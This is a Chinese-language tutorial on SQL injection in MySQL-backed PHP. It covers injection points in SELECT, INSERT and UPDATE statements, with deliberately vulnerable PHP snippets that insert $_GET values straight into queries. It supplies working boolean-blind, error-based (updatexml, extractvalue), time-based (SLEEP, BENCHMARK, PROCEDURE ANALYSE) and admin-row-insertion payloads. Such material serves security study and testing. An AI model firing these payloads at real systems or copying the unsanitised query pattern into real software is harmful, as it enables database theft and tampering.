SELECT 注入

select语句一般用于查询,可以查询任意字符串或者函数.使用help select来查看一下select语句的语法:

1.注入点在 select_expr

示例代码:

<?php    error_reporting(0);    $conn = mysqli_connect("127.0.0.1","root","root","test");    $res = mysqli_query($conn,"select {$_GET['id']},passwd from demo");    $row = mysqli_fetch_array($res);    echo "<center>";    echo "<h2>"."你的id是".$_GET['id']."</h2>";    echo "<br>";    echo "<h3>"."你的姓名是".$row["name"]."</h3>";    echo "<br>";    echo "<h4>"."你的密码是".$row["passwd"]."</h4>";?>

注入点在select_expr，可以使用子查询去获取我们想要的信息，但是由于没有产生数据库查询后的结果回显在页面中，所以这里可以利用子查询进行布尔盲注和时间盲注。

使用case when 进行布尔盲注

(select (case when (1=1) then 1 else (SELECT 111 UNION SELECT 222) END))(select (case when (1=2) then 1 else (SELECT 111 UNION SELECT 222) END)

或者直接时间盲注获得数据。



2.注入点在 table_references

<?php       error_reporting(0);       $conn = mysqli_connect("127.0.0.1","root","root","test");       $res = mysqli_query($conn,"select id,name,passwd from ${_GET['table']}");       $row = mysqli_fetch_array($res);       echo "<center>";       echo "<h2>"."你的id是".$_row['id']."</h2>";       echo "<br>";       echo "<h3>"."你的姓名是".$row["name"]."</h3>";       echo "<br>";       echo "<h4>"."你的密码是".$row["passwd"]."</h4>";?>

在黑盒测试下，这个地方几乎是很难注入的，得知道表名。


3.注入点在where或having后

这种是我们最常见的注入点，闭合以后注入就行了。使用联合查询最为方便，开启报错就用报错注入，不能就布尔注入或者时间盲注。

select id,name,passwd from demo where id = ${_GET['id']};           //数字型select id,name,passwd from demo where id ="."(('".$_GET['id']."'))" //字符型 '))闭合


4.注入点在group by或order by后

select id,name,passwd from demo order by ${_GET['title']};

这种也可以使用case when来布尔盲注

(select (case when (1=1) then 1 else (SELECT 111 UNION SELECT 222) END))(select (case when (1=2) then 1 else (SELECT 111 UNION SELECT 222)

再或者在你知道字段的情况下，可以直接用order by来布尔盲注，观察页面是以id排序还是以passwd排序

title=if(database() like "t%",id,passwd)执行的SQL:select id,name,passwd from demo order by if(database() like "t%",id,passwd

或者使用时间盲注也是可以的。


5.注入点在limit后

select id,name,passwd from demo limit {$_GET['limit']};

limit前没有order by的情况下，我们是可以使用联合查询的。

limit前如果有order by，那就得尝试下面两种


procedure子句

从MySQL5.7.18开始弃用，并在MySQL8.0中删除。

官方文档:

https://dev.mysql.com/doc/refman/5.7/en/procedure-analyse.html

ANALYSE()检查来自查询的结果并返回对结果的分析

在开启了报错的情况下，直接用这个payload就可以注入。

procedure analyse(updatexml(1,concat(0x7e, user()),1), 1);

如果没有开启报错，这时我们可以用benchmark()函数作为时间注入函数。注意这里不能用sleep()函数，使用会报错。

BENCHMARK(count,expr)

BENCHMARK()函数重复countTimes次执行表达式expr，它可以用于计时MySQL处理表达式有多快。

攻击payload如下

procedure analyse((select extractvalue(rand(),concat(0x3a,(if(database() like 't%', BENCHMARK(8000000,SHA1(1)),1))))),2000);只需要修改其中if(database() like 't%'条件，就可以时间盲注获取到数据了。

INSERT 注入

insert是插入数据的语句。

1.注入点在table_name后

insert into {$_GET['table']} values(1,1,1,1);

这个地方如果黑盒测试一般没办法利用，得知道表名，当然你可以爆破。如果恰好知道存放用户的表，也许可以利用。

http://127.0.0.1/test/sql.php?table=test_admin+values(2,'admin','666666')%23

insert into test_admin values(2,'admin','666666')#


2.注入点在values

insert into demo values(1,1,1,'{$_GET['data']}');

构造一下 闭合 http://127.0.0.1/test/sql.php?data=1' AND SLEEP(5) AND '1'='1

insert into demo values(1,1,1,'1' AND SLEEP(5) AND '1'='1');



UPDATE 注入

update用于数据的更新。

这里的注入点和select差不多，就不多赘述了，就之说一下SET后的注入吧。

update demo set passwd = '{$_GET['changePasswd']}' where id = 1;

有报错可以直接报错注入

payload如下:

asddddddddsad'or extractvalue(0,concat(0x7c,version())) or'

或者用时间注入

asddddddddsad'or sleep(5) or'
